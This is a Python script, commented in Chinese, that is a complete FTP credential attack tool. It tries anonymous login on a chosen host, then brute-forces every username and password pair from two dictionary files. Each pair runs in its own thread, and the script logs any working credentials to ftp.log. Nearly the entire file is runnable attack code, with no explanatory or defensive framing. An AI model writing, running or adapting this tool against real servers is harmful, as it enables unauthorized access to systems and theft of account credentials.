import ftplib
import argparse
import logging
import queue
import threading

logging.basicConfig(filename='./ftp.log', level=logging.INFO,
                    format='%(levelname)s | %(asctime)s | %(funcName)s | %(message)s')


# 匿名登录
def anonLogin(host, port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host=host, port=port)
        ftp.login('', '')
        ftp.quit()
        logging.info("[*] %s : %s FTP Anonymous Login Succeeded!" % (host, port))
        print("[*] %s : %s FTP Anonymous Login Succeeded!" % (host, port))
        return True
    except ftplib.all_errors as e:
        logging.exception(e)
        logging.error("[-] %s : %s FTP Anonymous Login Failed!" % (host, port))
        print(e)
        print("[-] %s : %s FTP Anonymous Login Failed!" % (host, port))
        return False


# 暴力破解
def bruteLogin(host, port, user, passwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host=host, port=port)
        ftp.login(user=user, passwd=passwd)
        ftp.quit()
        logging.info("[*] %s : %s FTP Login Succeeded!     user:%s passwd:%s" % (host, port, user, passwd))
        print("[*] FTP Login Succeeded!     user:%s passwd:%s" % (user, passwd))
    except ftplib.all_errors:
        logging.error("[-] %s : %s FTP Login Failed     user:%s passwd:%s" % (host, port, user, passwd))
        pass


def mult_brute(host, port, username, password):
    try:
        logging.info("------ %s : %d Brute Starting ------" % (host, port))
        threads = []
        q = queue.Queue()
        with open(username, 'r') as u:
            for line in u.readlines():
                user = line.split("\n")[0]
                with open(password, 'r') as p:
                    for line2 in p.readlines():
                        passwd = line2.split("\n")[0]
                        threads.append(
                            threading.Thread(target=bruteLogin, args=(str(host), int(port), str(user), str(passwd))))
            for t in threads:
                q.put(t)
            while not q.empty():
                q.get().start()
            for t in threads:
                t.join()
        logging.info("------ %s : %d Brute Finished ------" % (host, port))
    except Exception as e:
        logging.exception(e)
        print(e)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H', '--host', metavar='hostname', type=str, help='set target host')
    parser.add_argument('-P', '--port', metavar='PORT', type=int, default=21, help='Set ftp port, default is 21')
    parser.add_argument('-u', '--user', metavar='username_file_path', type=str, default='./user.txt',
                        help="set username dictionary file, default is './user.txt'")
    parser.add_argument('-p', '--passwd', metavar='password_file_path', type=str, default='./pass.txt',
                        help="set password dictionary file, default is './pass.txt'")
    args = parser.parse_args()
    if args.host is None:
        print(parser.usage)
    elif args.host is not None:
        anonLogin(args.host, args.port)
        con = input("是否继续进行账号密码爆破（y/n，其它默认继续）：")
        if con == 'n' or con == 'N':
            pass
        else:
            mult_brute(args.host, args.port, args.user, args.passwd)


if __name__ == "__main__":
    main()
